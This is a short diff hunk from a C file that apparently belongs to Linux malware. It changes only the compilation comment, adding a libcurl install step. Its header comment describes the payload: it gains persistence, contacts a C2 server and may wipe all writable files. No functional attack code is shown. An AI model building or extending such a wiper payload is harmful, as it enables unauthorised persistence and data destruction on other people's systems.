@@ -2,8 +2,11 @@
 #include <stdlib.h>
 #include <curl/curl.h>
 
-// Compilation: gcc main.c -o main -lcurl
-
+/* Compilation: 
+ * sudo apt install libcurl4-openssl-dev
+ * gcc main.c -o main -lcurl
+ *
+*/
 /* 
  * This is a pure C payload meant to target Linux systems in an effort to establish persistence. 
  * This payload will attempt to contact the C2, after which it may receive instruction to walk the file system and wipe all writable files.
